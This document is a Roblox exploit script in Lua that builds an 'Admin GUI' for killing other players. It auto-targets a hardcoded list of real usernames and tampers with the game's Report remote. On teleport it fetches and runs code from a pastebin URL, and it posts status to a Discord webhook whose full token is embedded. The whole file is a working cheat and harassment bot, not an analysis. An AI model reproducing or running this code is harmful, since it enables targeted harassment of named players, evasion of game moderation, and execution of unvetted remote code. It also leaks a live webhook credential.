if game.PlaceId ~= 26838733 then return end
if Anndrr1y then return end
pcall(function() getgenv().Anndrr1y = true end)

local Players              = game:GetService("Players")
local RunService           = game:GetService("RunService")
local Workspace            = game:GetService("Workspace")
local StarterGui           = game:GetService("StarterGui")
local ReplicatedStorage    = game:GetService("ReplicatedStorage")
local VirtualUser          = game:GetService("VirtualUser")
local CoreGui              = game:GetService("CoreGui")
local TeleportService      = game:GetService("TeleportService")
local HttpService          = game:GetService("HttpService")
local Remotes              = ReplicatedStorage:WaitForChild("Remotes", 2)
local LocalPlayer          = Players.LocalPlayer
local PlayerGui            = LocalPlayer:WaitForChild("PlayerGui", 2)
local requestFunc          = (syn and syn.request) or (http and http.request) or http_request or request
local webhookUrl           = "https://discord.com/api/webhooks/1553008088909353031/dYPugF4X_rJNr_1y9cUo4N7J4D7N5dkeaquTl2eFyzklDtXTz_fqbbKRg7YJg_30Xre7"

local BlindGuisTable       = { ScreenFog = true, DarknessGui = true, VolleyballScreenGui = true, FlashBangEffect = true }
local LocalPlayerWhiteList = { LocalPlayer.UserId }
local WhiteList            = { ["Anndrr1y95"] = true, ["MasterNoob_NMancer"] = true, ["coolbaldi124"] = true }
local BadList              = {
    ["Hardboiled_eggy"] = true, ["1UltimateGamerG"] = true, ["Kdospapaj"] = true, ["7ealous"] = true,
    ["GrumpyPunch"] = true, ["robloxplayer"] = true, ["CatalogHitlist"] = true, ["Hard_boiledEggy"] = true,
    ["jnterlud"] = true, ["Phacadism"] = true, ["Monochromancies"] = true, ["hinfwehh"] = true,
    ["Pryus_ll"] = true, ["thrien07"] = true, ["Robloxiane4o7u0n6d"] = true, ["Jesus1462"] = true,
    ["gamercraig4678"] = true, ["gamercraig44"] = true, ["AlexMiskevkiller"] = true, ["vinluscent"] = true,
    ["1can5p3ak"] = true, ["boingstore"] = true, ["TheOverseer8787"] = true, ["llredistributorll"] = true,
    ["GasterGaming1381"] = true, ["dude4dude4"] = true, ["Monochromacies"] = true, ["jinterlud"] = true,
    ["OLEADERMNVA"] = true, ["ViperkillerQ8"] = true, ["Chillystorm"] = true, ["Unavailable"] = true,
    ["Gralienated"] = true, ["PortmanteauOfRetina"] = true, ["Tempest_Sniper"] = true, ["OGCOWBELLS"] = true,
    ["Oasprey"] = true, ["AceVoltOZ"] = true, ["liedetectorfear"] = true, ["skarsplanet"] = true,
    ["ProDevam4572"] = true, ["LG_amer"] = true, ["ymn_jooz"] = true, ["HydraHZz"] = true, ["my1_babyyoda"] = true,
    ["stoioom"] = true, ["ArcaneOfHeaven"] = true, ["Rebxls"] = true, ["Doomedandsad22"] = true,
    ["CielleMeow"] = true, ["Vaaa0x"] = true, ["Cassandra3216"] = true, ["epicgurt117"] = true,
    ["yingxing1106"] = true, ["godzilla_rendon"] = true, ["bestnakrothvn123_xtv"] = true, ["nothing120485"] = true,
    ["ttenshiyun"] = true, ["its_steve1027"] = true, ["John_Dexter30"] = true, ["DRPADORU"] = true,
    ["XIXAlonXIX"] = true, ["RAMADAD_087"] = true, ["Cookess0"] = true, ["Plasmafractal"] = true,
    ["ltslivmoose"] = true, ["Captain_falcon12345"] = true, ["ejacobi101"] = true, ["lilloulou5"] = true,
    ["ShahCozy"] = true, ["Fortune302x"] = true, ["azeiurrr"] = true, ["Astralcyte"] = true, ["a_0ly"] = true,
    ["uazeed"] = true, ["ydidmyaccountgetban"] = true, ["hanoteam1"] = true, ["Margarine_2453"] = true,
    ["BlueSphereOfDoom"] = true, ["i3629"] = true, ["VanTomio"] = true, ["Woolpigeon123"] = true,
    ["llmrmaxll"] = true, ["GeneralFerocious"] = true, ["zork153"] = true, ["Coolio4508"] = true,
    ["LegitimatelyLucas"] = true, ["DenTheDuck"] = true, ["ANoobWithRoblox"] = true, ["Oil_2453"] = true,
    ["OldSoul04"] = true, ["JustNubingYa"] = true, ["358927"] = true, ["Walkwaay"] = true,
    ["XxNikeboyJakexX"] = true, ["cruvele"] = true, ["Teroces1"] = true, ["Hemilina"] = true,
    ["alan2SWVY"] = true, ["sableglass"] = true, ["lolooliveros"] = true, ["SefuRatoi"] = true,
    ["Jonathan_lopez"] = true, ["Bubbles_TPBS"] = true, ["ZPhate"] = true, ["sadthebad3"] = true,
    ["nolreun"] = true, ["ianvixie"] = true, ["NIcemanss15022010y"] = true, ["Kr_ii"] = true,
    ["FranksaYTLTU"] = true, ["Accord_2007x"] = true, ["crahsxdxd12"] = true, ["Arioch_IV"] = true,
    ["joepapapo2"] = true, ["raashid45"] = true, ["Skiddrows"] = true, ["kingslayer1611"] = true,
    ["d3v_nu11"] = true, ["westo_123sss"] = true, ["josiie14568"] = true, ["XXLOLdudeXP"] = true,
    ["cedricmaster12345"] = true, ["Hungry_Hippo20071"] = true, ["jlethal_80"] = true, ["ChocoboNomNom"] = true,
    ["Nickiboysss"] = true, ["KahootSong0912"] = true, ["Omniscientsaiyan"] = true, ["bina1685"] = true,
    ["Arikohni"] = true, ["yx_doomspire"] = true, ["BliindBandit1"] = true, ["Vencizlav"] = true,
    ["ExVintzed"] = true, ["joshua1dude!SBACK"] = true, ["sir_zelix"] = true, ["FireLynX990"] = true,
    ["BottledRobloxian"] = true, ["invincibleone1234"] = true, ["AntiShield_Bot"] = true,
    ["Superiorbatbear15"] = true, ["StarlightSeneg"] = true, ["Cielle_2"] = true, ["no1caresok2"] = true,
    ["dabestplayer910"] = true, ["sheeshsheeshstop"] = true, ["eldavisdg"] = true, ["oxe2024"] = true,
    ["Davidcoolppapppd"] = true, ["RYANBUCKTON14"] = true, ["JayxXxError2ndacc"] = true,
    ["MistfulWaters"] = true, ["Humanagon"] = true, ["mook924365718"] = true, ["PaarseNathan"] = true,
    ["NeddoZ"] = true, ["Ryan09791"] = true, ["noob666rt"] = true, ["Okuni1"] = true, ["VeVe_hipeeps"] = true,
    ["erenkaratepe"] = true, ["Kellish"] = true, ["0Nach"] = true, ["Verlitarim"] = true, ["CielleRibbit"] = true
}

local gearTable            = {
    ["KorbloxSwordAndShield"] = { ["name"] = "KorbloxSwordAndShield", ["id"] = 68539623 },
    ["StepGun"] = { ["name"] = "StepGun", ["id"] = 34898883 },
    ["SuperFlyGoldBoombox"] = { ["name"] = "SuperFlyGoldBoombox", ["id"] = 212641536 }
}

local LoopkillList         = {}
local whitelist            = {}
local FFkillList           = {}
local blackList            = {}
local lastTargets          = {}
local killnewplayers       = false
local LegacyKillMethod     = true
local creator              = true
local PlatformConnection   = nil
local AntiHKillConnection  = nil
local NaN                  = 0 / 0
local anchorWhenRespawn    = true
local botPlatformCreated   = false
local messageId            = nil

local function sendInitialDiscordMessage(text)
    if not requestFunc then return end
    local response = requestFunc({
        Url = webhookUrl .. "?wait=true",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            content = text
        })
    })
    if response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        if success and data and data.id then
            messageId = data.id
        end
    end
end

local function editDiscordMessage(text)
    if not requestFunc then return end
    if not messageId then
        sendInitialDiscordMessage(text)
        return
    end
    
    requestFunc({
        Url = webhookUrl .. "/messages/" .. messageId,
        Method = "PATCH",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            content = text
        })
    })
end

local function ServerHop()
    editDiscordMessage("Rejoining...")
    pcall(function()
        if queue_on_teleport then
            queue_on_teleport([[loadstring(game:HttpGet("https://pastebin.com/raw/hAGCQrSD"))()]])
        end
    end)
    
    local serversUrl = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(serversUrl))
    end)
    
    if success and result and result.data then
        for _, server in ipairs(result.data) do
            if server.playing < server.maxPlayers and server.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
                task.wait(2)
            end
        end
    end
    
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end

local function startStatusTracker()
    sendInitialDiscordMessage("Rejoined! Initializing target scanner...")
    
    local timer = 0
    local interval = 5
    
    task.spawn(function()
        while task.wait(interval) do
            local foundEnemies = {}
            for _, player in pairs(Players:GetPlayers()) do
                if BadList and BadList[player.Name] then
                    table.insert(foundEnemies, player.Name)
                end
            end
            
            if #foundEnemies > 0 then
                timer = 0
                editDiscordMessage("Found Enemy! Targets present: " .. table.concat(foundEnemies, ", "))
            else
                timer = timer + interval
                local minutes = math.floor(timer / 60)
                local seconds = timer % 60
                
                if timer >= 300 then
                    editDiscordMessage("No enemies found for 5 minutes. Rejoining...")
                    task.wait(1)
                    ServerHop()
                    break
                else
                    editDiscordMessage(string.format("Searching... No targets found. Timer: %dm %02ds / 5m 00s", minutes, seconds))
                end
            end
        end
    end)
end

local function Notify(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 6,
    })
end

local function isAlive(humanoid)
    return (humanoid and (humanoid.Health > 0 or humanoid.Health ~= humanoid.Health)) or false
end

local function insertToList(list, v)
    local index = table.find(list, v)
    if index then return end
    table.insert(list, v)
end

local function RemoveFromList(List, Thing)
    local index = table.find(List, Thing)
    if not index then return end
    table.remove(List, index)
end

local function checkPermisson(v)
    return (whitelist[v] or table.find(LocalPlayerWhiteList, v))
end

local function isWhitelistedPlayer(plr)
    if not plr then return false end
    return checkPermisson(plr.UserId) or WhiteList[plr.Name] ~= nil
end

local function FindPlayers(Me, input)
    local foundTargets = {}
    if not input or input == "" then return foundTargets end
    local target = input:lower()
    local allplayers = Players:GetPlayers()
    if target == "all" then
        for i = 1, #allplayers do
            local plr = allplayers[i]
            if not isWhitelistedPlayer(plr) then
                table.insert(foundTargets, plr)
            end
        end
    elseif target == "me" then
        table.insert(foundTargets, Me)
    elseif target == "others" then
        for i = 1, #allplayers do
            local plr = allplayers[i]
            if plr ~= Me then
                table.insert(foundTargets, plr)
            end
        end
    else
        for i = 1, #allplayers do
            local plr = allplayers[i]
            if (string.sub(plr.Name:lower(), 1, #target) == target or string.sub(plr.DisplayName:lower(), 1, #target) == target) then
                table.insert(foundTargets, plr)
            end
        end
    end

    task.spawn(function()
        lastTargets = foundTargets
    end)
    return foundTargets
end

local function ToggleAsset(id)
    ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("ToggleAsset"):InvokeServer(id)
end

local function cleanball()
    for _, part in pairs(Workspace:GetChildren()) do
        if part.Name == "Part" then
            local sound = part:FindFirstChild("HoHoHo")
            if sound then
                part:Destroy()
            end
        end
    end
end

local function cleantouch(character)
    local tool = character:FindFirstChildOfClass("Tool")
    if not tool then return end
    local handle = tool:FindFirstChild("Handle")
    if not handle then return end
    local touch = handle:FindFirstChild("TouchInterest")
    if not touch then return end
    touch:Destroy()
end

local function getOrEquipTool(toolName, toolId)
    local char = LocalPlayer.Character
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not (char and backpack) then return nil end
    
    local tool = char:FindFirstChild(toolName) or backpack:FindFirstChild(toolName)
    if not tool then
        ToggleAsset(toolId)
        task.wait(0.2)
        backpack = LocalPlayer:FindFirstChild("Backpack")
        tool = backpack and backpack:FindFirstChild(toolName)
    end
    
    if tool and tool.Parent == backpack then
        local humanoid = char:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:EquipTool(tool)
        end
    end
    return tool
end

local function LegacykorbloxNew()
    if #FFkillList == 0 then return end
    
    local character = LocalPlayer.Character
    if not character then return end
    local Humanoid = character:FindFirstChild("Humanoid")
    if not Humanoid then return end

    local sword = getOrEquipTool("KorbloxSwordAndShield", gearTable["KorbloxSwordAndShield"]["id"])

    if sword and sword.Parent ~= character then
        sword.Parent = character
    end

    local swordHandle = sword and sword:FindFirstChild("Handle")

    task.spawn(function() cleanball() end)

    local cloneList = FFkillList
    for i = 1, #cloneList do
        local Player = cloneList[i]
        if not Player or Player == LocalPlayer then continue end
        local char = Player.Character

        if not char then
            RemoveFromList(FFkillList, Player)
            continue
        end

        local targetTorso = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
        local targetHumanoid = char:FindFirstChild("Humanoid")

        if not (targetTorso and targetHumanoid and isAlive(targetHumanoid)) then
            RemoveFromList(FFkillList, Player)
            continue
        end

        if swordHandle and firetouchinterest then
            firetouchinterest(swordHandle, targetTorso, 0)
            firetouchinterest(swordHandle, targetTorso, 1)
        end
    end

    if sword then sword:Activate() end
end

pcall(function()
    local shothook; shothook = hookmetamethod(game, "__namecall", function(self, ...)
        local args = { ... }
        local method = getnamecallmethod()
        if tostring(self) == "Report" and method == "FireServer" then
            args[1] = CFrame.new(NaN, NaN, NaN, NaN, NaN, NaN, NaN, NaN, NaN, NaN, NaN, NaN)
        end
        return shothook(self, unpack(args))
    end)
end)

local function kill(table)
    pcall(function()
        for i = 1, #table do
            task.spawn(function()
                local target = table[i]
                local Character = target and target.Character
                if not (target and Character) then return end
                local Humanoid = Character:FindFirstChildOfClass("Humanoid")
                if isAlive(Humanoid) then
                    if target == LocalPlayer then return end
                    insertToList(FFkillList, target)
                end
            end)
        end
    end)
end

local function MainLoop()
    pcall(function()
        for _, v in pairs(Players:GetPlayers()) do
            if BadList[v.Name] then
                insertToList(LoopkillList, v)
            end
        end
        task.spawn(function()
            if #LoopkillList == 0 then return end
            kill(LoopkillList)
        end)
        task.spawn(function()
            if #FFkillList == 0 then return end
            LegacykorbloxNew()
        end)
    end)
end

task.spawn(function()
    while true do
        task.wait()
        task.spawn(function()
            MainLoop()
        end)
    end
end)

startStatusTracker()

task.spawn(function()
    while true do
        task.wait(1)
        pcall(function()
            if not botPlatformCreated then
                local platform = Instance.new("Part")
                platform.Name = "BotStandPlatform"
                platform.Size = Vector3.new(100, 10, 100)
                platform.CFrame = CFrame.new(25000, 24995, 0)
                platform.Anchored = true
                platform.CanCollide = true
                platform.Parent = Workspace
                botPlatformCreated = true
            end
            
            local char = LocalPlayer.Character
            if char then
                char:PivotTo(CFrame.new(25000, 25000, 0))
            end
        end)
    end
end)

task.spawn(function()
    for _, v in pairs(PlayerGui:GetChildren()) do
        if BlindGuisTable[v.Name] then
            v:Destroy()
        end
    end
end)

local function AnchorPlayer()
    local Character = LocalPlayer.Character
    if Character then
        Character:PivotTo(CFrame.new(25000, 25000, 0))
    end
end

local function CheckForBlackListKill(v)
    local ID = v.UserId
    if table.find(blackList, ID) or BadList[v.Name] then
        insertToList(LoopkillList, v)
    end
end

Players.PlayerRemoving:Connect(function(v)
    RemoveFromList(FFkillList, v)
    RemoveFromList(LoopkillList, v)
end)

LocalPlayer.CharacterAdded:Connect(function(v)
    if anchorWhenRespawn then
        AnchorPlayer()
    end
end)

PlayerGui.ChildAdded:Connect(function(v)
    task.wait()
    if BlindGuisTable[v.Name] then
        v:Destroy()
    end
end)

local function PlayerJoinedSetUp(v)
    CheckForBlackListKill(v)
    if BadList[v.Name] then
        insertToList(LoopkillList, v)
        kill({v})
    end
    if killnewplayers then
        insertToList(LoopkillList, v)
        insertToList(blackList, v.UserId)
    end
end

for _, v in pairs(Players:GetPlayers()) do
    PlayerJoinedSetUp(v)
end

Players.PlayerAdded:Connect(function(v)
    PlayerJoinedSetUp(v)
end)

task.spawn(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)

task.spawn(function()
    pcall(function()
        task.wait(60)
        Players.LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)
end)

task.spawn(function()
    pcall(function()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj.Name == "ForceField" or obj.Name == "Arrows everywhere" then
                obj:Destroy()
            end
        end
        Workspace.DescendantAdded:Connect(function(obj)
            if obj.Name == "ForceField" or obj.Name == "Arrows everywhere" then
                obj:Destroy()
            end
        end)
    end)
end)

if game.PlaceId == 26838733 then
    if creator then
        Remotes.BecomeAvatar:FireServer("10781161298")
    end
    task.spawn(function()
        ToggleAsset(gearTable["StepGun"]["id"])
        ToggleAsset(gearTable["KorbloxSwordAndShield"]["id"])
    end)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Anndrr1yGui"
ScreenGui.ResetOnSpawn = false

pcall(function()
    ScreenGui.Parent = CoreGui
end)
if not ScreenGui.Parent then
    ScreenGui.Parent = PlayerGui
end

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 500, 0, 360)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -180)
MainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 35)
TitleBar.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = TitleBar

local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 10)
TitleFix.Position = UDim2.new(0, 0, 1, -10)
TitleFix.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, -40, 1, 0)
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Anndrr1y Admin GUI"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextSize = 16
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 25, 0, 25)
CloseBtn.Position = UDim2.new(1, -30, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextSize = 14
CloseBtn.Parent = TitleBar

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 4)
CloseCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local TargetInput = Instance.new("TextBox")
TargetInput.Name = "TargetInput"
TargetInput.Size = UDim2.new(1, -20, 0, 30)
TargetInput.Position = UDim2.new(0, 10, 0, 45)
TargetInput.BackgroundColor3 = Color3.fromRGB(38, 38, 45)
TargetInput.BorderSizePixel = 0
TargetInput.PlaceholderText = "Target Player (e.g. all, me, others, username)"
TargetInput.Text = ""
TargetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
TargetInput.Font = Enum.Font.SourceSans
TargetInput.TextSize = 14
TargetInput.Parent = MainFrame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 6)
InputCorner.Parent = TargetInput

local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Name = "ScrollFrame"
ScrollFrame.Size = UDim2.new(1, -20, 1, -90)
ScrollFrame.Position = UDim2.new(0, 10, 0, 85)
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.BorderSizePixel = 0
ScrollFrame.ScrollBarThickness = 6
ScrollFrame.Parent = MainFrame

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.CellSize = UDim2.new(0, 150, 0, 35)
UIGridLayout.CellPadding = UDim2.new(0, 8, 0, 8)
UIGridLayout.Parent = ScrollFrame

UIGridLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIGridLayout.AbsoluteContentSize.Y + 10)
end)

local function CreateBtn(name, callback)
    local btn = Instance.new("TextButton")
    btn.Name = name .. "Btn"
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    btn.BorderSizePixel = 0
    btn.Text = name
    btn.TextColor3 = Color3.fromRGB(230, 230, 230)
    btn.Font = Enum.Font.SourceSansSemibold
    btn.TextSize = 14
    btn.Parent = ScrollFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        callback(TargetInput.Text)
    end)
end

CreateBtn("Kill", function(input)
    local targets = FindPlayers(LocalPlayer, input ~= "" and input or "me")
    kill(targets)
end)

CreateBtn("Loop Kill", function(input)
    local targets = FindPlayers(LocalPlayer, input ~= "" and input or "me")
    for _, v in pairs(targets) do
        insertToList(LoopkillList, v)
    end
end)

CreateBtn("Unloop Kill", function(input)
    local targets = FindPlayers(LocalPlayer, input ~= "" and input or "me")
    for _, v in pairs(targets) do
        RemoveFromList(LoopkillList, v)
        RemoveFromList(blackList, v.UserId)
    end
end)

CreateBtn("Whitelist", function(input)
    local targets = FindPlayers(LocalPlayer, input ~= "" and input or "me")
    for _, plr in pairs(targets) do
        if not checkPermisson(plr.UserId) then
            whitelist[plr.UserId] = true
        end
    end
end)

CreateBtn("Unwhitelist", function(input)
    local targets = FindPlayers(LocalPlayer, input ~= "" and input or "me")
    for _, plr in pairs(targets) do
        if checkPermisson(plr.UserId) and plr.UserId ~= LocalPlayer.UserId then
            whitelist[plr.UserId] = false
        end
    end
end)

CreateBtn("Toggle Anchor", function()
    if not anchorWhenRespawn then
        AnchorPlayer()
        anchorWhenRespawn = true
    else
        anchorWhenRespawn = false
    end
end)

CreateBtn("Toggle Anti-Plat", function()
    if PlatformConnection then
        PlatformConnection:Disconnect()
        PlatformConnection = nil
    else
        PlatformConnection = RunService.Heartbeat:Connect(function()
            for _, v in pairs(Players:GetPlayers()) do
                task.spawn(function()
                    if v ~= LocalPlayer then
                        pcall(function()
                            local char = v.Character
                            if not char then return end
                            local root = char:FindFirstChild("HumanoidRootPart")
                            if not root then return end
                            root.Size = Vector3.new(100, 100, 100)
                            root.CanCollide = false
                        end)
                    end
                end)
            end
        end)
    end
end)

CreateBtn("Toggle Anti-HKill", function()
    if AntiHKillConnection then
        AntiHKillConnection:Disconnect()
        AntiHKillConnection = nil
        local char = LocalPlayer.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if root then
            root.Anchored = false
        end
    else
        AntiHKillConnection = RunService.Heartbeat:Connect(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Character then
                    for _, instance in pairs(player.Character:GetDescendants()) do
                        if instance:IsA("BasePart") then
                            instance.CanCollide = false
                        elseif instance:IsA("TouchInterest") then
                            instance:Destroy()
                        end
                    end
                end
            end
            
            local char = LocalPlayer.Character
            if char then
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                local root = char:FindFirstChild("HumanoidRootPart")
                
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BodyPosition") or v:IsA("BodyThrust") or v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("LinearVelocity") or v:IsA("AngularVelocity") then
                        v:Destroy()
                    end
                end
                
                if humanoid and root then
                    if humanoid.MoveDirection.Magnitude == 0 then
                        root.Anchored = true
                    else
                        root.Anchored = false
                    end
                end
            end
        end)
    end
end)
